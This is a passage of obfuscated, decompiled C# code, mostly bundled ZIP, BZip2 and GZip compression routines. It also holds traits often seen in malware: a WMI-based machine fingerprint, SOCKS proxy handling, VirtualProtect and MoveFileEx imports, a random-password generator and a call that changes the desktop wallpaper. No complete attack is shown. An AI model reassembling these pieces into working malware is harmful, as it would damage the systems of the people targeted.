			else
			{
				num = class38_0.int_23;
			}
			if (class38_0.gclass2_0.int_1 != 0)
			{
				int num2 = Class6.smethod_371(class38_0.gclass2_0, class38_0.byte_1, class38_0.int_36 + class38_0.int_38, num);
				class38_0.int_38 += num2;
				if (class38_0.int_38 >= Class38.int_14)
				{
					class38_0.int_27 = class38_0.byte_1[class38_0.int_36] & 0xFF;
					class38_0.int_27 = ((class38_0.int_27 << class38_0.int_31) ^ (class38_0.byte_1[class38_0.int_36 + 1] & 0xFF)) & class38_0.int_30;
				}
				continue;
			}
			break;
		}
		while (class38_0.int_38 < Class38.int_16 && class38_0.gclass2_0.int_1 != 0);
	}

	static int smethod_166(Class32 class32_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class32_0.int_3 >= class32_0.int_4)
		{
			return 0;
		}
		int num = 0;
		int num2 = int_0 + int_1;
		int num3;
		do
		{
			num3 = Class6.smethod_496(class32_0, byte_0[int_0++]);
			if (num3 > 0)
			{
				num++;
			}
		}
		while (int_0 < num2 && num3 == 1);
		return num;
	}

	static EventArgs4 smethod_167(string string_0, string string_1)
	{
		EventArgs4 eventArgs = new EventArgs4(string_1, Enum6.const_21);
		eventArgs.string_1 = string_0;
		return eventArgs;
	}

	static void smethod_168(string string_0, bool bool_0, GClass1 gclass1_0, string string_1)
	{
		Class6.smethod_126((string)null, bool_0, string_1, gclass1_0, string_0);
	}

	static Enum25 smethod_169(Class53 class53_0)
	{
		return class53_0.enum25_0;
	}

	static void smethod_170(string string_0, GClass1 gclass1_0, string string_1, string string_2)
	{
		Class6.smethod_126(string_1, bool_0: false, string_0, gclass1_0, string_2);
	}

	static Stream13 smethod_171(string string_0, GClass0 gclass0_0)
	{
		if (gclass0_0.class8_0.gclass1_0 == null)
		{
			throw new InvalidOperationException("Use OpenReader() only with ZipFile.");
		}
		return Class6.smethod_176(gclass0_0, string_0);
	}

	static void smethod_172(GClass0 gclass0_0, string string_0)
	{
		if (gclass0_0.enum2_1 == Enum2.const_0)
		{
			return;
		}
		if (gclass0_0.enum2_1 == Enum2.const_1)
		{
			if (string_0 == null)
			{
				throw new ZipException("Missing password.");
			}
			gclass0_0.ArchiveStream.Seek(gclass0_0.FileDataPosition - 12L, SeekOrigin.Begin);
			gclass0_0.class21_0 = Class6.smethod_476(gclass0_0, string_0);
		}
		else if (gclass0_0.enum2_1 == Enum2.const_2 || gclass0_0.enum2_1 == Enum2.const_3)
		{
			if (string_0 == null)
			{
				throw new ZipException("Missing password.");
			}
			if (gclass0_0.class19_0 != null)
			{
				Class6.smethod_18(string_0, gclass0_0.class19_0);
				return;
			}
			int num = Class6.smethod_75(gclass0_0.enum2_1);
			gclass0_0.ArchiveStream.Seek(gclass0_0.FileDataPosition - num, SeekOrigin.Begin);
			int int_ = Class6.smethod_222(gclass0_0.enum2_1);
			gclass0_0.class19_0 = Class6.smethod_508(int_, string_0, gclass0_0.ArchiveStream);
		}
	}

	static long smethod_173(GClass0 gclass0_0, ref Stream stream_0)
	{
		long result = -1L;
		if (gclass0_0.enum0_0 == Enum0.const_2)
		{
			Class6.smethod_286(gclass0_0);
			stream_0 = gclass0_0.stream_1;
			try
			{
				result = gclass0_0.stream_1.Length;
				return result;
			}
			catch (NotSupportedException)
			{
				return result;
			}
		}
		if (gclass0_0.enum0_0 == Enum0.const_3)
		{
			string string_ = ((gclass0_0.enum2_1 == Enum2.const_0) ? null : (gclass0_0.string_3 ?? Class6.smethod_363(gclass0_0.class8_0)));
			gclass0_0.stream_1 = Class6.smethod_176(gclass0_0, string_);
			Class6.smethod_286(gclass0_0);
			stream_0 = gclass0_0.stream_1;
			result = gclass0_0.stream_1.Length;
		}
		else
		{
			if (gclass0_0.enum0_0 == Enum0.const_5)
			{
				if (gclass0_0.stream_1 == null)
				{
					gclass0_0.stream_1 = gclass0_0.delegate1_0(gclass0_0.string_1);
				}
				Class6.smethod_286(gclass0_0);
				stream_0 = gclass0_0.stream_1;
				try
				{
					result = gclass0_0.stream_1.Length;
					return result;
				}
				catch (NotSupportedException)
				{
					return result;
				}
			}
			if (gclass0_0.enum0_0 == Enum0.const_1)
			{
				stream_0 = File.Open(gclass0_0.string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
				result = stream_0.Length;
			}
		}
		return result;
	}

	static void smethod_174(GClass0 gclass0_0)
	{
		if (gclass0_0.enum2_0 != Enum2.const_1 && gclass0_0.enum2_0 != Enum2.const_2 && gclass0_0.enum2_0 != Enum2.const_3 && gclass0_0.enum2_0 != 0)
		{
			if (gclass0_0.uint_1 != 0)
			{
				throw new ZipException($"Cannot extract: Entry {gclass0_0.string_1} is encrypted with an algorithm not supported by DotNetZip: {gclass0_0.UnsupportedAlgorithm}");
			}
			throw new ZipException($"Cannot extract: Entry {gclass0_0.string_1} uses an unsupported encryption algorithm ({(int)gclass0_0.enum2_0:X2})");
		}
	}

	static void smethod_175(Class38 class38_0)
	{
		switch (class38_0.class39_0.enum15_0)
		{
		case Enum15.const_0:
			class38_0.delegate5_0 = class38_0.method_0;
			break;
		case Enum15.const_1:
			class38_0.delegate5_0 = class38_0.method_1;
			break;
		case Enum15.const_2:
			class38_0.delegate5_0 = class38_0.method_2;
			break;
		}
	}

	static Stream13 smethod_176(GClass0 gclass0_0, string string_0)
	{
		Class6.smethod_267(gclass0_0);
		Class6.smethod_174(gclass0_0);
		Class6.smethod_172(gclass0_0, string_0);
		if (gclass0_0.enum0_0 != Enum0.const_3)
		{
			throw new BadStateException("You must call ZipFile.Save before calling OpenReader");
		}
		long long_ = ((gclass0_0.short_9 == 0) ? gclass0_0.long_1 : gclass0_0.long_2);
		Stream archiveStream = gclass0_0.ArchiveStream;
		gclass0_0.ArchiveStream.Seek(gclass0_0.FileDataPosition, SeekOrigin.Begin);
		gclass0_0.stream_2 = Class6.smethod_112(archiveStream, gclass0_0);
		Stream stream_ = Class6.smethod_374(gclass0_0, gclass0_0.stream_2);
		return new Stream13(stream_, long_);
	}

	static void smethod_177(Stream9 stream9_0, Enum21 enum21_0)
	{
		if (stream9_0.bool_0)
		{
			throw new ObjectDisposedException("DeflateStream");
		}
		stream9_0.stream12_0.enum21_0 = enum21_0;
	}

	static void smethod_178(string string_0, string string_1, GClass1 gclass1_0, string string_2)
	{
		foreach (GClass0 item in Class6.smethod_76(string_2, string_1, gclass1_0))
		{
			item.Password = gclass1_0.string_3;
			Class6.smethod_185(item, string_0);
		}
	}

	static void smethod_179(Stream3 stream3_0)
	{
		if (stream3_0.int_1 == 0)
		{
			throw new InvalidOperationException("No bytes available.");
		}
		if (stream3_0.bool_0)
		{
			throw new InvalidOperationException("The final block has already been transformed.");
		}
		Array.Copy(BitConverter.GetBytes(stream3_0.int_0++), 0, stream3_0.byte_0, 0, 4);
		stream3_0.byte_1 = stream3_0.icryptoTransform_0.TransformFinalBlock(stream3_0.byte_0, 0, 16);
		Class6.smethod_529(stream3_0, stream3_0.byte_2, 0, stream3_0.int_1);
		stream3_0.hmacsha1_0.TransformFinalBlock(stream3_0.byte_2, 0, stream3_0.int_1);
		stream3_0.bool_0 = true;
	}

	static void smethod_180(Class32 class32_0)
	{
		byte[][] byte_ = class32_0.class33_0.byte_4;
		int num = class32_0.int_9 + 2;
		int num2 = Class35.int_5;
		while (--num2 >= 0)
		{
			byte[] array = byte_[num2];
			int num3 = num;
			while (--num3 >= 0)
			{
				array[num3] = Class32.byte_0;
			}
		}
		int num4 = ((class32_0.int_10 < 200) ? 2 : ((class32_0.int_10 < 600) ? 3 : ((class32_0.int_10 < 1200) ? 4 : ((class32_0.int_10 < 2400) ? 5 : 6))));
		Class6.smethod_303(num4, num, class32_0);
		int num5 = Class6.smethod_113(num4, class32_0, num);
		Class6.smethod_667(num5, num4, class32_0);
		Class6.smethod_641(num4, class32_0, num);
		Class6.smethod_79(class32_0);
		Class6.smethod_555(num4, class32_0, num5);
		Class6.smethod_210(num4, num, class32_0);
		Class6.smethod_606(num5, class32_0);
	}

	static EventArgs4 smethod_181(string string_0, GClass0 gclass0_0, string string_1)
	{
		EventArgs4 eventArgs = new EventArgs4();
		eventArgs.string_0 = string_1;
		eventArgs.enum6_0 = Enum6.const_19;
		eventArgs.gclass0_0 = gclass0_0;
		eventArgs.string_1 = string_0;
		return eventArgs;
	}

	static string smethod_182(string string_0, string string_1)
	{
		string text = null;
		string name = Assembly.GetExecutingAssembly().GetName().Name;
		do
		{
			string text2 = Guid.NewGuid().ToString();
			string path = string.Format("{0}-{1}-{2}.{3}", name, DateTime.Now.ToString("yyyyMMMdd-HHmmss"), text2, string_0);
			text = Path.Combine(string_1, path);
		}
		while (File.Exists(text) || Directory.Exists(text));
		return text;
	}

	static void smethod_183(Stream8 stream8_0)
	{
		byte[] array = new byte[4] { 66, 90, 104, 0 };
		array[3] = (byte)(48 + stream8_0.int_6);
		byte[] array2 = array;
		stream8_0.stream_0.Write(array2, 0, array2.Length);
	}

	static byte smethod_184(byte byte_0, byte byte_1, byte byte_2)
	{
		if (byte_1 >= byte_0)
		{
			if (byte_0 <= byte_2)
			{
				if (byte_1 <= byte_2)
				{
					return byte_1;
				}
				return byte_2;
			}
			return byte_0;
		}
		if (byte_0 >= byte_2)
		{
			if (byte_1 >= byte_2)
			{
				return byte_1;
			}
			return byte_2;
		}
		return byte_0;
	}

	static void smethod_185(GClass0 gclass0_0, string string_0)
	{
		Class6.smethod_497((string)null, (Stream)null, string_0, gclass0_0);
	}

	static int smethod_186(GClass0 gclass0_0, byte[] byte_0, int int_0, short short_0, long long_0)
	{
		GClass0.Class23 CS_0024_003C_003E8__locals0 = new GClass0.Class23();
		CS_0024_003C_003E8__locals0.byte_0 = byte_0;
		CS_0024_003C_003E8__locals0.int_1 = int_0;
		CS_0024_003C_003E8__locals0.long_0 = long_0;
		gclass0_0.bool_10 = true;
		if (short_0 > 28)
		{
			throw new BadReadException($"  Inconsistent size (0x{short_0:X4}) for ZIP64 extra field at position 0x{CS_0024_003C_003E8__locals0.long_0:X16}");
		}
		CS_0024_003C_003E8__locals0.int_0 = short_0;
		GClass0.Delegate4<long> @delegate = delegate
		{
			if (CS_0024_003C_003E8__locals0.int_0 < 8)
			{
				throw new BadReadException($"  Missing data for ZIP64 extra field, position 0x{CS_0024_003C_003E8__locals0.long_0:X16}");
			}
			long result = BitConverter.ToInt64(CS_0024_003C_003E8__locals0.byte_0, CS_0024_003C_003E8__locals0.int_1);
			CS_0024_003C_003E8__locals0.int_1 += 8;
			CS_0024_003C_003E8__locals0.int_0 -= 8;
			return result;
		};
		if (gclass0_0.long_2 == 4294967295L)
		{
			gclass0_0.long_2 = @delegate();
		}
		if (gclass0_0.long_0 == 4294967295L)
		{
			gclass0_0.long_0 = @delegate();
		}
		if (gclass0_0.long_4 == 4294967295L)
		{
			gclass0_0.long_4 = @delegate();
		}
		return CS_0024_003C_003E8__locals0.int_1;
	}

	static Encoding smethod_187(Stream0 stream0_0)
	{
		return stream0_0.encoding_0;
	}

	static string smethod_188(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		RNGCryptoServiceProvider rngcryptoServiceProvider_ = new RNGCryptoServiceProvider();
		while (int_0-- > 0)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="[Class6.smethod_464(rngcryptoServiceProvider_, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!=".Length)]);
		}
		return stringBuilder.ToString();
	}

	static byte smethod_189(Class21 class21_0)
	{
		ushort num = (ushort)((ushort)(class21_0.uint_0[2] & 0xFFFFu) | 2u);
		return (byte)(num * (num ^ 1) >> 8);
	}

	static void smethod_190(Class52 class52_0, Class54 class54_0)
	{
		class54_0.class52_0 = class52_0;
	}

	static int smethod_191(int int_0)
	{
		return Class37.int_0[int_0];
	}

	static bool smethod_192(string string_0)
	{
		return Class6.smethod_607((TextWriter)null, string_0, bool_0: false);
	}

	static int smethod_193(Stream10 stream10_0)
	{
		byte[] array = ((stream10_0.string_1 == null) ? null : Stream10.encoding_0.GetBytes(stream10_0.string_1));
		byte[] array2 = ((stream10_0.string_0 == null) ? null : Stream10.encoding_0.GetBytes(stream10_0.string_0));
		int num = ((stream10_0.string_1 != null) ? (array.Length + 1) : 0);
		int num2 = ((stream10_0.string_0 != null) ? (array2.Length + 1) : 0);
		int num3 = 10 + num + num2;
		byte[] array3 = new byte[num3];
		int num4 = 0;
		num4 = 1;
		array3[0] = 31;
		num4 = 2;
		array3[1] = 139;
		num4 = 3;
		array3[2] = 8;
		byte b = 0;
		if (stream10_0.string_1 != null)
		{
			b = (byte)(b ^ 0x10u);
		}
		if (stream10_0.string_0 != null)
		{
			b = (byte)(b ^ 8u);
		}
		array3[num4++] = b;
		if (!stream10_0.nullable_0.HasValue)
		{
			stream10_0.nullable_0 = DateTime.Now;
		}
		int value = (int)(stream10_0.nullable_0.Value - Stream10.dateTime_0).TotalSeconds;
		Array.Copy(BitConverter.GetBytes(value), 0, array3, num4, 4);
		num4 += 4;
		array3[num4++] = 0;
		array3[num4++] = byte.MaxValue;
		if (num2 != 0)
		{
			Array.Copy(array2, 0, array3, num4, num2 - 1);
			num4 += num2 - 1;
			array3[num4++] = 0;
		}
		if (num != 0)
		{
			Array.Copy(array, 0, array3, num4, num - 1);
			num4 += num - 1;
			array3[num4++] = 0;
		}
		stream10_0.stream12_0.stream_0.Write(array3, 0, array3.Length);
		return array3.Length;
	}

	static void smethod_194(Class61 class61_0, string string_0)
	{
		if (string_0 == null)
		{
			throw new ArgumentNullException();
		}
		class61_0.string_0 = string_0;
	}

	static uint smethod_195(Class40 class40_0)
	{
		uint uint_ = class40_0.uint_0;
		class40_0.enum16_0 = Class40.Enum16.const_0;
		class40_0.int_8 = 0;
		class40_0.int_9 = 0;
		class40_0.int_13 = 0;
		class40_0.int_12 = 0;
		if (class40_0.object_0 != null)
		{
			class40_0.gclass2_0.uint_0 = (class40_0.uint_0 = Class6.smethod_439(0u, (byte[])null, 0, 0));
		}
		return uint_;
	}

	static string smethod_196(Class53 class53_0)
	{
		return class53_0.string_1;
	}

	static void smethod_197(Socket socket_0, Class57 class57_0)
	{
		if (socket_0 == null)
		{
			throw new ArgumentNullException();
		}
		class57_0.socket_0 = socket_0;
	}

	static int smethod_198(Class43 class43_0)
	{
		GClass2 gclass2_ = class43_0.gclass2_0;
		class43_0.gclass2_0.long_1 = 0L;
		gclass2_.long_0 = 0L;
		class43_0.gclass2_0.string_0 = null;
		class43_0.enum17_0 = ((!class43_0.bool_0) ? Class43.Enum17.const_7 : Class43.Enum17.const_0);
		Class6.smethod_195(class43_0.class40_0);
		return 0;
	}

	static void smethod_199(Stream6 stream6_0)
	{
		stream6_0.uint_1 = Class6.smethod_32(stream6_0);
		stream6_0.enum11_0 = Stream6.Enum11.const_0;
		stream6_0.class34_0 = null;
		if (stream6_0.uint_1 != stream6_0.uint_3)
		{
			string message = $"BZip2 CRC error (expected {stream6_0.uint_1:X8}, computed {stream6_0.uint_3:X8})";
			throw new IOException(message);
		}
	}

	static void smethod_200(string string_0)
	{
		if ((File.GetAttributes(string_0) & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
		{
			File.SetAttributes(string_0, FileAttributes.Normal);
		}
		File.Delete(string_0);
	}

	static Class65 smethod_201(Class83 class83_0, bool bool_0 = true, Class81 class81_0)
	{
		Class81.Class82 CS_0024_003C_003E8__locals0 = new Class81.Class82();
		CS_0024_003C_003E8__locals0.class83_0 = class83_0;
		lock (Class81.object_0)
		{
			Class81.bool_0 = bool_0;
			if (Class81.list_0 == null)
			{
				Class81.list_0 = new List<Class65>();
			}
			Class65 @class = Class81.list_0.Where((Class65 class65_0) => class65_0.method_1() == CS_0024_003C_003E8__locals0.class83_0.method_0()).FirstOrDefault();
			if (@class == null)
			{
				@class = new Class65(CS_0024_003C_003E8__locals0.class83_0);
				Class6.smethod_71((Class63)@class);
				Class81.list_0.Add(@class);
			}
			if (@class.method_3() != CS_0024_003C_003E8__locals0.class83_0.method_8())
			{
				throw new Exception("Socks Version Mismatch for Port " + CS_0024_003C_003E8__locals0.class83_0.method_0());
			}
			return @class;
		}
	}

	static int smethod_202(Class73.Class76 class76_0)
	{
		return class76_0.int_1;
	}

	static void smethod_203(GClass1 gclass1_0)
	{
		gclass1_0.bool_5 = true;
	}

	static void smethod_204(GClass1 gclass1_0, Stream stream_0)
	{
		if (stream_0 == null)
		{
			throw new ArgumentNullException("outputStream");
		}
		if (!stream_0.CanWrite)
		{
			throw new ArgumentException("Must be a writable stream.", "outputStream");
		}
		gclass1_0.string_0 = null;
		gclass1_0.stream_1 = new Stream4(stream_0);
		gclass1_0.bool_5 = true;
		gclass1_0.bool_4 = false;
		Class6.smethod_617(gclass1_0);
	}

	static GClass0 smethod_205(string string_0, Stream stream_0)
	{
		return Class6.smethod_597((object)stream_0, string_0, Enum0.const_2, (object)null);
	}

	static string smethod_206()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		string text = "";
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");
		ManagementObjectCollection val2 = val.Get();
		bool flag = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"));
		ManagementObjectEnumerator enumerator = val2.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementBaseObject current = enumerator.get_Current();
				ManagementObject val3 = (ManagementObject)current;
				text = ((ManagementBaseObject)val3).get_Properties().get_Item("Caption").get_Value()
					.ToString() + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432") + ((ManagementBaseObject)val3).get_Properties().get_Item("Version").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		text.Replace(" ", "");
		text.Replace("Windows", "");
		text.Replace("windows", "");
		text += (flag ? ":64" : "=32");
		MD5 mD = MD5.Create();
		byte[] array = mD.ComputeHash(Encoding.Default.GetBytes(text));
		string text2 = BitConverter.ToString(array);
		return text2.Replace("-", "");
	}

	static int smethod_207(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.CodecBufferSize;
		}
		if (class8_0.stream1_0 != null)
		{
			return class8_0.stream1_0.method_0();
		}
		return class8_0.stream0_0.method_0();
	}

	static void smethod_208(bool bool_0, string string_0, string string_1, string string_2, GClass1 gclass1_0)
	{
		Class6.smethod_103(string_1, bool_0, string_2, string_0, gclass1_0, bool_1: true);
	}

	static GClass2 smethod_209(Stream12 stream12_0)
	{
		if (stream12_0.gclass2_0 == null)
		{
			bool bool_ = stream12_0.enum23_0 == Enum23.const_0;
			stream12_0.gclass2_0 = new GClass2();
			if (stream12_0.enum22_0 == Enum22.const_1)
			{
				Class6.smethod_470(bool_, stream12_0.gclass2_0);
			}
			else
			{
				stream12_0.gclass2_0.enum21_0 = stream12_0.enum21_0;
				GClass2 gclass2_ = stream12_0.gclass2_0;
				Enum20 enum20_ = stream12_0.enum20_0;
				Class6.smethod_92(enum20_, gclass2_, bool_);
			}
		}
		return stream12_0.gclass2_0;
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool VirtualProtect([In] byte[] byte_0, IntPtr intptr_0, int int_0, out int int_1);

	static void smethod_210(int int_0, int int_1, Class32 class32_0)
	{
		byte[][] byte_ = class32_0.class33_0.byte_4;
		for (int i = 0; i < int_0; i++)
		{
			byte[] array = byte_[i];
			uint num = array[0] & 0xFFu;
			Class6.smethod_291(class32_0.class31_0, 5, num);
			for (int j = 0; j < int_1; j++)
			{
				int num2;
				for (num2 = array[j] & 0xFF; num < num2; num++)
				{
					Class6.smethod_291(class32_0.class31_0, 2, 2u);
				}
				while (num > num2)
				{
					Class6.smethod_291(class32_0.class31_0, 2, 3u);
					num--;
				}
				Class6.smethod_291(class32_0.class31_0, 1, 0u);
			}
		}
	}

	static void smethod_211(GClass1 gclass1_0)
	{
		EventHandler<EventArgs2> eventHandler_ = gclass1_0.eventHandler_3;
		if (eventHandler_ != null)
		{
			EventArgs2 e = Class6.smethod_626(gclass1_0.ArchiveNameForEvent);
			eventHandler_(gclass1_0, e);
		}
	}

	static int smethod_212(ushort ushort_0, int int_0, byte[] byte_0)
	{
		int num = int_0;
		while (true)
		{
			if (num + 3 < byte_0.Length)
			{
				ushort num2 = (ushort)(byte_0[num++] + byte_0[num++] * 256);
				if (num2 == ushort_0)
				{
					break;
				}
				short num3 = (short)(byte_0[num++] + byte_0[num++] * 256);
				num += num3;
				continue;
			}
			return -1;
		}
		return num - 2;
	}

	static void smethod_213(GClass1 gclass1_0)
	{
		Stream readStream = gclass1_0.ReadStream;
		int num = Class6.smethod_246(readStream);
		byte[] array = null;
		int num2 = 0;
		if (num == 101075792L)
		{
			array = new byte[52];
			readStream.Read(array, 0, array.Length);
			long num3 = BitConverter.ToInt64(array, 0);
			if (num3 < 44L)
			{
				throw new ZipException("Bad size in the ZIP64 Central Directory.");
			}
			gclass1_0.ushort_0 = BitConverter.ToUInt16(array, num2);
			num2 += 2;
			gclass1_0.ushort_1 = BitConverter.ToUInt16(array, num2);
			num2 += 2;
			gclass1_0.uint_0 = BitConverter.ToUInt32(array, num2);
			num2 += 2;
			array = new byte[num3 - 44L];
			readStream.Read(array, 0, array.Length);
			num = Class6.smethod_246(readStream);
			if (num != 117853008L)
			{
				throw new ZipException("Inconsistent metadata in the ZIP64 Central Directory.");
			}
			array = new byte[16];
			readStream.Read(array, 0, array.Length);
			num = Class6.smethod_246(readStream);
		}
		if (num != 101010256L)
		{
			readStream.Seek(-4L, SeekOrigin.Current);
			throw new BadReadException($"Bad signature ({num:X8}) at position 0x{readStream.Position:X8}");
		}
		array = new byte[16];
		gclass1_0.ReadStream.Read(array, 0, array.Length);
		if (gclass1_0.uint_0 == 0)
		{
			gclass1_0.uint_0 = BitConverter.ToUInt16(array, 2);
		}
		Class6.smethod_402(gclass1_0);
	}

	static int smethod_214(Stream0 stream0_0)
	{
		return stream0_0.int_1;
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static void smethod_215(GClass0 gclass0_0, GClass1 gclass1_0)
	{
		EventHandler<EventArgs2> eventHandler_ = gclass1_0.eventHandler_3;
		if (eventHandler_ != null)
		{
			string archiveNameForEvent = gclass1_0.ArchiveNameForEvent;
			int count = gclass1_0.dictionary_0.Count;
			EventArgs2 eventArgs = Class6.smethod_8(count, archiveNameForEvent, gclass0_0);
			eventHandler_(gclass1_0, eventArgs);
			if (eventArgs.bool_0)
			{
				gclass1_0.bool_10 = true;
			}
		}
	}

	static int smethod_216(Stream12 stream12_0)
	{
		int num = 0;
		byte[] array = new byte[10];
		int num2 = stream12_0.stream_0.Read(array, 0, array.Length);
		switch (num2)
		{
		case 0:
			return 0;
		default:
			throw new GException0("Not a valid GZIP stream.");
		case 10:
			if (array[0] == 31 && array[1] == 139 && array[2] == 8)
			{
				int num3 = BitConverter.ToInt32(array, 4);
				DateTime dateTime_ = Stream10.dateTime_0;
				stream12_0.dateTime_0 = dateTime_.AddSeconds(num3);
				num += num2;
				if ((array[3] & 4) == 4)
				{
					num2 = stream12_0.stream_0.Read(array, 0, 2);
					num += num2;
					short num4 = (short)(array[0] + array[1] * 256);
					byte[] array2 = new byte[num4];
					num2 = stream12_0.stream_0.Read(array2, 0, array2.Length);
					if (num2 != num4)
					{
						throw new GException0("Unexpected end-of-file reading GZIP header.");
					}
					num += num2;
				}
				if ((array[3] & 8) == 8)
				{
					stream12_0.string_0 = Class6.smethod_337(stream12_0);
				}
				if ((array[3] & 0x10) == 16)
				{
					stream12_0.string_1 = Class6.smethod_337(stream12_0);
				}
				if ((array[3] & 2) == 2)
				{
					stream12_0.Read(stream12_0.byte_1, 0, 1);
				}
				return num;
			}
			throw new GException0("Bad GZIP header.");
		}
	}

	static string smethod_217(Stream10 stream10_0)
	{
		return stream10_0.string_0;
	}

	static void smethod_218(GClass1 gclass1_0)
	{
		EventHandler<EventArgs1> eventHandler_ = gclass1_0.eventHandler_1;
		if (eventHandler_ != null)
		{
			EventArgs1 e = Class6.smethod_118(gclass1_0.ArchiveNameForEvent);
			eventHandler_(gclass1_0, e);
		}
	}

	static string smethod_219(Class61 class61_0)
	{
		return class61_0.string_0;
	}

	static void smethod_220(byte[] byte_0, int int_0, Stream3 stream3_0, int int_1)
	{
		int i = int_1;
		for (int num = int_0 + int_1; i < byte_0.Length && i < num; i += 16)
		{
			Class6.smethod_663(stream3_0, byte_0, i);
		}
	}

	static bool smethod_221(FileAttributes fileAttributes_0, Class14 class14_0)
	{
		bool flag;
		if (flag = Class6.smethod_265(FileAttributes.Hidden, class14_0, fileAttributes_0))
		{
			flag = Class6.smethod_265(FileAttributes.System, class14_0, fileAttributes_0);
		}
		if (flag)
		{
			flag = Class6.smethod_265(FileAttributes.ReadOnly, class14_0, fileAttributes_0);
		}
		if (flag)
		{
			flag = Class6.smethod_265(FileAttributes.Archive, class14_0, fileAttributes_0);
		}
		if (flag)
		{
			flag = Class6.smethod_265(FileAttributes.NotContentIndexed, class14_0, fileAttributes_0);
		}
		if (flag)
		{
			flag = Class6.smethod_265(FileAttributes.ReparsePoint, class14_0, fileAttributes_0);
		}
		if (class14_0.comparisonOperator_0 != ComparisonOperator.EqualTo)
		{
			flag = !flag;
		}
		return flag;
	}

	static int smethod_222(Enum2 enum2_0)
	{
		return enum2_0 switch
		{
			Enum2.const_3 => 256, 
			Enum2.const_2 => 128, 
			_ => -1, 
		};
	}

	static void smethod_223(IEnumerable<string> ienumerable_0, GClass1 gclass1_0, bool bool_0, string string_0)
	{
		if (ienumerable_0 == null)
		{
			throw new ArgumentNullException("fileNames");
		}
		gclass1_0.bool_10 = false;
		Class6.smethod_384(gclass1_0);
		if (bool_0)
		{
			foreach (string item in ienumerable_0)
			{
				if (!gclass1_0.bool_10)
				{
					if (string_0 != null)
					{
						string fullPath = Path.GetFullPath(Path.Combine(string_0, Path.GetDirectoryName(item)));
						Class6.smethod_407(gclass1_0, item, fullPath);
					}
					else
					{
						Class6.smethod_407(gclass1_0, item, (string)null);
					}
					continue;
				}
				break;
			}
		}
		else
		{
			foreach (string item2 in ienumerable_0)
			{
				if (!gclass1_0.bool_10)
				{
					Class6.smethod_407(gclass1_0, item2, string_0);
					continue;
				}
				break;
			}
		}
		if (!gclass1_0.bool_10)
		{
			Class6.smethod_211(gclass1_0);
		}
	}

	static void smethod_224(Class31 class31_0, byte byte_0)
	{
		Class6.smethod_291(class31_0, 8, (uint)byte_0);
	}

	static bool smethod_225(Class63 class63_0)
	{
		return class63_0.bool_0;
	}

	static string smethod_226(string string_0, GClass1 gclass1_0)
	{
		if (string_0.EndsWith("\\"))
		{
			return string_0;
		}
		return string_0 + "\\";
	}

	static void smethod_227(Class42 class42_0, int int_0, int int_1, int[] int_2, int int_3, int[] int_4, int int_5)
	{
		class42_0.int_0 = 0;
		class42_0.byte_0 = (byte)int_0;
		class42_0.byte_1 = (byte)int_1;
		class42_0.int_8 = int_2;
		class42_0.int_9 = int_3;
		class42_0.int_10 = int_4;
		class42_0.int_11 = int_5;
		class42_0.int_2 = null;
	}

	static void smethod_228(Stream6 stream6_0)
	{
		if (stream6_0.int_11 < stream6_0.char_0)
		{
			Class6.smethod_328((byte)(stream6_0.int_6 = stream6_0.int_8), stream6_0.gclass3_0);
			stream6_0.int_11++;
			stream6_0.enum11_0 = Stream6.Enum11.const_7;
		}
		else
		{
			stream6_0.int_10++;
			stream6_0.int_7 = 0;
			Class6.smethod_149(stream6_0);
		}
	}

	static bool smethod_229(Class10 class10_0, long long_0)
	{
		bool flag = false;
		return class10_0.comparisonOperator_0 switch
		{
			ComparisonOperator.GreaterThan => long_0 > class10_0.long_0, 
			ComparisonOperator.GreaterThanOrEqualTo => long_0 >= class10_0.long_0, 
			ComparisonOperator.LesserThan => long_0 < class10_0.long_0, 
			ComparisonOperator.LesserThanOrEqualTo => long_0 <= class10_0.long_0, 
			ComparisonOperator.EqualTo => long_0 == class10_0.long_0, 
			ComparisonOperator.NotEqualTo => long_0 != class10_0.long_0, 
			_ => throw new ArgumentException("Operator"), 
		};
	}

	static Socket smethod_230(Class60 class60_0)
	{
		return class60_0.socket_0;
	}

	static void smethod_231(Class60 class60_0, Socket socket_0)
	{
		if (class60_0.socket_0 != null)
		{
			class60_0.socket_0.Close();
		}
		class60_0.socket_0 = socket_0;
	}

	static bool smethod_232(GClass0 gclass0_0)
	{
		if (gclass0_0.long_2 < 16L)
		{
			return false;
		}
		if (gclass0_0.short_8 == 0)
		{
			return false;
		}
		if (gclass0_0.enum20_0 == Enum20.const_0)
		{
			return false;
		}
		if (gclass0_0.long_0 < gclass0_0.long_2)
		{
			return false;
		}
		if (gclass0_0.enum0_0 == Enum0.const_2 && !gclass0_0.stream_1.CanSeek)
		{
			return false;
		}
		if (gclass0_0.class19_1 != null && gclass0_0.long_0 - Class6.smethod_538(gclass0_0.class19_1) <= gclass0_0.long_2 + 16L)
		{
			return false;
		}
		if (gclass0_0.class21_1 != null && gclass0_0.long_0 - 12L <= gclass0_0.long_2)
		{
			return false;
		}
		return true;
	}

	static GClass0 smethod_233(GClass1 gclass1_0, string string_0)
	{
		return Class6.smethod_129(gclass1_0, string_0, (string)null);
	}

	static void smethod_234(Form1 form1_0, string string_0)
	{
		Class6.SystemParametersInfo(20u, 0u, string_0, 3u);
	}

